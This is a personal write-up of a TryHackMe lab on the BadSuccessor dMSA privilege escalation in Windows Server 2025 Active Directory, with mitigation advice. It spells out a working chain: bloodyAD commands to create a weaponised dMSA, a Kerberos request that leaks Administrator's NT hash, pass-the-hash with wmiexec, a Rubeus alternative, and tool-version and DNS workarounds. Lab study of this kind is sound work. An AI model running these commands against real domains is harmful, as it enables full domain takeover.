# AD: BadSuccessor - dMSA Privilege Escalation (TryHackMe)

- **Path:** Jr Penetration Tester > Vulnerability Knowledge (premium)
- **Completed:** 2026-10-11 - **Network:** Recent-Threats-BadSuccessor (separate VPN profile),
  subnet <ip>/24. DC = DC-LAB2025-01 @ <ip>, Workstation @ <ip>.
- Solved LIVE headless from own Windows PC via pip bloodyAD + Impacket (Linux path). No AttackBox,
  no RDP. Lab creds only.
- Starting creds: tbyte / <redacted-pw> (domain tryhackme.local).

## Answer sheet

| Task | Question | Answer |
|---|---|---|
| 3 | Windows version that introduced dMSA | *(find it yourself)* |
| 4 | Username of the third privileged account | *(find it yourself)* |
| 5 | Flag on Administrator's Desktop | THM{…} |

## The vulnerability (BadSuccessor, Akamai / Yuval Gordon)
A delegated Managed Service Account (dMSA, new in Windows Server 2025) supports "migration": a dMSA
can succeed a legacy account via the attribute `msDS-ManagedAccountPrecededByLink` (the preceded
account) plus `msDS-DelegatedMSAState = 2` (migration completed). When a dMSA with these set
requests a TGT, the KDC trusts the link and issues the dMSA a ticket whose KERB-DMSA-KEY-PACKAGE
contains the PRECEDED account's keys, and whose PAC carries the preceded account's group
memberships. Crucially, you need NO write access to the victim: only the right to CREATE a dMSA in
an OU (`CreateChild`, or `GenericAll`/`WriteDACL`/`WriteOwner` over any OU). So any user who can
create child objects in an OU can succeed Administrator and own the domain.

## Reconnaissance (Task 4)
The provided `Get-BadSuccessorOUPermissions.ps1` enumerates OUs for principals holding
`CreateChild|GenericAll|WriteDACL|WriteOwner`. Replicated it as Administrator (post-exploit) with a
PowerShell ACL sweep over all OUs filtered to `TRYHACKME\*` Allow ACEs:
```
hmann, tbyte, *(find it yourself)*   (plus default groups Domain Admins / Enterprise Admins)
```
The three non-default user accounts are hmann, tbyte, and one more -> the third account is *(find it yourself)*.
(From Linux, `bloodyAD get writable --detail` as tbyte already confirmed `CREATE_CHILD` over
`OU=LabOU,DC=tryhackme,DC=local`.)

## Exploitation (Linux path, from Windows Python)
Tooling: `pip install "bloodyAD==2.1.18" impacket`. Pin 2.1.18 - the newer bloodyAD additionally
writes a "superseded" link on the victim (Administrator), which tbyte cannot do, and it fails with
`insufficientAccessRights`. 2.1.18 only touches the dMSA.

1. Confirm rights:
```
bloodyAD -d tryhackme.local -u tbyte -p '<redacted-pw>' --host DC-LAB2025-01.tryhackme.local \
  --dc-ip <ip> --dns <ip> get writable
  -> OU=LabOU,DC=tryhackme,DC=local : CREATE_CHILD
```
2. Create + weaponize the dMSA (impersonate Administrator by default):
```
bloodyAD ... add badSuccessor pentest_thm2
  -> [*] Creating DMSA pentest_thm2$ in OU=LabOU
  -> [*] Impersonating: CN=Administrator,CN=Users,DC=tryhackme,DC=local
```
(The TGT auto-fetch failed here only due to DNS - see gotchas - but the dMSA attributes were set.)
3. Request the dMSA TGT (the BadSuccessor-specific step), addressing the KDC by IP:
```
minikerberosbad-getS4U2self \
  'kerberos+pw://tryhackme.local%5Ctbyte:<redacted-pw>@<ip>' \
  'krbtgt/tryhackme.local@tryhackme.local' 'pentest_thm2$@tryhackme.local' --dmsa --ccache admin.ccache
```
Output included:
```
dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: <redacted-hash>     <- Administrator's NT hash, handed over in the ticket
```
4. Pass-the-hash as Administrator and read the flag (no DCSync needed):
```
wmiexec.py 'tryhackme.local/administrator@<ip>' -hashes :<redacted-hash> \
  'cmd.exe /c type C:\Users\Administrator\Desktop\flag.txt'
  -> THM{…}
```

### Alternate (room's) path, Windows
On the workstation (RDP): `SharpSuccessor.exe add /path:"ou=LabOU,..." /account:tbyte
/name:pentest_dmsa /impersonate:Administrator` -> `Rubeus.exe tgtdeleg /nowrap` -> `Rubeus.exe
asktgs /targetuser:pentest_dmsa$ /service:krbtgt/... /dmsa /ptt /ticket:...` -> `dir
\\DC\c$\Users\Administrator\Desktop\`. The room's Linux path does DCSync with `secretsdump.py`
then PtH; here the Admin NT hash fell out of the dMSA ticket directly, so DCSync was optional.

## Gotchas (own-PC Windows specifics)
- Separate VPN: this room uses the `Recent-Threats-BadSuccessor` OpenVPN profile, not the standard
  THM VPN (only one at a time). Switched via openvpn-gui `--command disconnect_all` then
  `--command connect <profile>`.
- No DNS for `DC-LAB2025-01.tryhackme.local` and no admin to edit the hosts file. bloodyAD's LDAP
  used `--dns <ip>` fine, but its Kerberos client resolved the KDC by hostname and failed.
  Fix: address the KDC by IP in the minikerberos URL. `res.dc_ip = url.hostname`, and the
  `serverip=` query param is NOT honored in this version, so put the IP as the host and URL-encode
  the domain backslash as `%5C` (`tryhackme.local%5Ctbyte`).
- bloodyAD must be pinned to 2.1.18 (newer versions attempt an extra victim-side write that fails).

## Mitigation
- Audit and restrict who can create child objects / holds `CreateChild`/`GenericAll`/`WriteDACL`/
  `WriteOwner` on OUs (run Get-BadSuccessorOUPermissions). Least-privilege OU delegation.
- Monitor dMSA creation and `msDS-ManagedAccountPrecededByLink` / `msDS-DelegatedMSAState` changes
  (directory-service object-change auditing), and TGS requests carrying the dMSA key package.
- Microsoft had not fully patched this at disclosure; treat OU create rights as tier-0 sensitive.

## Lessons learned
- The dangerous primitive is `CreateChild` on an OU, not write access to the victim. A low-priv
  user who can make objects in an OU can mint a dMSA that succeeds Domain Admin.
- BadSuccessor leaks the victim's keys IN the Kerberos ticket (KERB-DMSA-KEY-PACKAGE), so you get
  the NT hash straight from the TGS - DCSync is a convenience, not a requirement.
- Headless AD from Windows: pip bloodyAD + Impacket works; fight DNS by addressing the KDC/DC by
  IP (-dc-ip for Impacket; IP-as-host + %5C for minikerberos URLs) when you can't edit hosts.
